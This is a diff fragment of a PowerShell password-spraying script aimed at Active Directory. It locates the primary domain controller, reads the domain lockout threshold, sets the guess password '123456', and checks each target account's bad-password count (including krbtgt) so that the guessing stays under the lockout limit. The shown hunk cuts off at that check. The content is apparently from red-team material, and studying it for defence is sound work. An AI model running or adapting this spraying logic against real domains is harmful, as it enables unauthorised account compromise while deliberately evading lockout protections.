@@ -112,6 +112,7 @@ $pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
 $lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
 $password = "123456"
 
+# (Get-Content users.txt)
 "krbtgt","spotless" | % {
     $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$domain,dc=local" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
     if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
